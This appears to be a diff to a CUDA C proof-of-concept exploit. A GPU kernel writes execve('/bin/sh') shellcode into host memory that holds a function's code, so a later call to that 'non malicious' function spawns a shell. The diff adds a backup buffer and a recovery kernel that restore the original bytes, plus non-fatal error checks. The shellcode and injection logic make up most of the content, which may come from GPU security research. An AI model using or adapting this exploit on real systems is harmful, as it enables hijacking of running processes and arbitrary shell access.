@@ -54,23 +54,44 @@ void aligned_free(void *ptr) {
 		exit(1);															\
 	} }
 
+#define CUDA_CHECK_NORETURN(value) {											\
+	cudaError_t _m_cudaStat = value;										\
+	if (_m_cudaStat != cudaSuccess) {										\
+		fprintf(stderr, "Error %s at line %d in file %s\nContinue\n",					\
+				cudaGetErrorString(_m_cudaStat), __LINE__, __FILE__);		\
+	} }
+
+
+__device__ char * backup_buf;
 
 /* CUDA kernel to copy the shellcode. Basically copies to source with given offset. */
 __global__ void PixsysCuda(char * d_source, int offset)
 {
+	if (threadIdx.x == 0) {
+		backup_buf = (char *) malloc(1024 * sizeof(char));
+	}
+	__syncthreads();
+
 	char shellcode[] = {
 			"\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f"
 			"\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
 			"\x54\x5f\x6a\x3b\x58\x0f\x05\x90\x90\x90"
 	};
-		(d_source+offset)[threadIdx.x]=shellcode[threadIdx.x];
 
+  backup_buf[threadIdx.x] = (d_source+offset)[threadIdx.x];
+  (d_source+offset)[threadIdx.x] = shellcode[threadIdx.x];
+}
+
+__global__ void PixsysRecover(char * d_source, int offset) {
+  (d_source+offset)[threadIdx.x] = backup_buf[threadIdx.x];
 }
 
 void Stub_Funct ()
 {
 	printf("NOTHING Here!\n");
 	__asm__(
+			"nop;"
+			"nop;"
 			"nop;"
 			"nop;"
 			"nop;"
@@ -200,6 +221,8 @@ int main(void) {
 	printf("GOING IN!\n");
 	fflush(stdout);
 
+CUDA_CHECK_NORETURN(cudaGetLastError());
+
 	/* Try to set up the mallicious bit */
 	try
 	{
@@ -211,6 +234,9 @@ int main(void) {
 	{
 		printf("NAH");
 	}
+
+CUDA_CHECK_NORETURN(cudaGetLastError());
+
 	/* register the info buffer. First things first... */
 	CUDA_CHECK_RETURN(cudaHostRegister((void *)info_for_cuda_driver, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE)) ;
 	/* Map what a Nice guy would think is a benevelent buffer.
@@ -222,19 +248,26 @@ int main(void) {
 	//printf("Device PTR is : 0x%08x\n",(unsigned int *)d_real_buff);
 	fflush(stdout);
 
+CUDA_CHECK_NORETURN(cudaGetLastError());
+
 	/* info buffer in UM can be changed now. No effect. */
 	//info_for_cuda_driver->start_addr = (unsigned long)stdout->_IO_write_base;
 	//printf("write_base addr: 0x%lx\n",(unsigned long)stdout->_IO_write_base);
 	//(stdout->_IO_write_base)[1]='W';
 
 	/*Activate cuda kernel, that copies shellcode */
-	PixsysCuda<<<1,64>>>(d_real_buff,offset);
+	PixsysCuda<<<1,32>>>(d_real_buff,offset);
 
 
 	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
 
 	f(); // Call "non malicious" function again.
-	CUDA_CHECK_RETURN(cudaGetLastError());
+	CUDA_CHECK_NORETURN(cudaGetLastError());
+
+	// Recover f()
+	printf("Now recover f()\n");
+	PixsysRecover<<<1,32>>>(d_real_buff,offset);
+
 
 		CUDA_CHECK_RETURN(cudaMemcpy((void *)h_target,d_target, pagesize*sizeof(char),cudaMemcpyDeviceToHost));
 		//printf("Target is: 0x%08x\n",*(unsigned int *) h_target);
@@ -242,7 +275,7 @@ int main(void) {
 		fflush(stdout);
 		CUDA_CHECK_RETURN(cudaHostUnregister((void *)real_buff)) ;
 		CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
-		CUDA_CHECK_RETURN(cudaGetLastError());
+		CUDA_CHECK_NORETURN(cudaGetLastError());
 	//}
 	//sleep(3000);
 	/*for (i = 0; i < WORK_SIZE; i++)
